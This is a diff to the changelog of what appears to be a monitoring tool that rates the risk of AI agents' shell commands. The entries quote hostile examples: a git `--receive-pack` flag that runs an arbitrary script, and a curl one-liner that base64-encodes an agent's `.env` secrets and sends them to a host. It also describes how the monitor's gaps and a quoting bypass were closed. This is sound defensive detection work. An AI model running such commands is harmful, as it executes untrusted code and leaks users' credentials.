@@ -1,5 +1,25 @@
 ## Unreleased
 
+### Release: git transport flags that run a program are high risk; env dumps naming tokens and a root agent are warnings (2026-09-25)
+- **Carries:** #6160 and #6166. Their entries follow.
+- Supersedes the earlier carrier #6165, which carried #6160 only and went stale on `CHANGELOG.md` once #6166 merged.
+
+### Fixed: `git --upload-pack` / `--receive-pack` / `--exec` rated high, not medium
+- These CLI flags make git run a named program, so `git push --receive-pack=/tmp/evil.sh origin main` is code execution, but it scored `medium` and a `min_risk: high` policy did not hold it. They now score `high` on any subcommand (`--exec` only where it names a pack program; `-u` only on `clone` / `ls-remote`), with the flag named in the reason. The standard `git-upload-pack` / `git-receive-pack` programs stay `medium`.
+- Quoting never changes a verdict: the command is unquoted before it is inspected, and a test pins that, closing the validator bypass that stripped single-quoted content. Second half of vivekchand/clawmetry-pro#244.
+
+### Fixed: an environment dump that prints other services' tokens, and an agent already running as root, are warnings
+- `credential_access` rated every bare `env` / `printenv` at info. A dump whose output names credentials (`SLACK_TOKEN=`, `OPENAI_API_KEY=`, matched on whole `_`-separated words, so `TOKENIZERS_PARALLELISM` and `SSH_AUTH_SOCK` do not count) is now a warning. Only the count is recorded, never the names or values, and it holds when the values are masked.
+- `privilege_change` only matched verbs that change privilege, so an agent started as root never raised anything. A bare identity probe (`whoami`, `id`, `id -u`) whose answer is root or uid 0 now raises `runs as root (uid 0)` at warning. `sudo whoami` stays elevation, not identity.
+- The ATLAS OpenClaw replay moves AML.CS0048 S05 (partial) and S06 (observed) to detected in both cold-start and learned-baseline runs, and residual gap G8 is retired. The controls stay quiet. Closes vivekchand/clawmetry-pro#261.
+
+### Release: a secret read and sent out in one command is critical (2026-09-25)
+- **Carries:** #6161. Its entry follows.
+
+### Fixed: a secret read and sent out in one command is critical, not a warning
+- `credential_access` escalated to critical only when egress happened in a call *after* the secret was read, so `curl https://host/?d=$(cat ~/.openclaw/.env | base64)` (the exfiltration HiddenLayer demonstrated, replayed as ATLAS AML.CS0051 S16) stayed at warning. The call that touches the secret now counts toward the egress window.
+- The ATLAS OpenClaw replay moves S16 from partial to detected in both cold-start and learned-baseline runs, and residual gap G3 is retired. The controls (`control-openclaw-env-template`, `control-openclaw-ordinary-day`) stay quiet. Closes vivekchand/clawmetry-pro#257.
+
 ### Release: Windows uninstall no longer stalls on large runtime folders (2026-09-23)
 - **Carries:** #6138 and #6150. Their entries follow.
 - The first attempt at this release (merged as `[RELEASE]` on 2026-09-23) did not publish: it failed in `Build v2 React bundle (fresh)`, on breakage that had been sitting on `main` since that morning. #6150 repairs it and adds the PR-time guard that would have caught it.
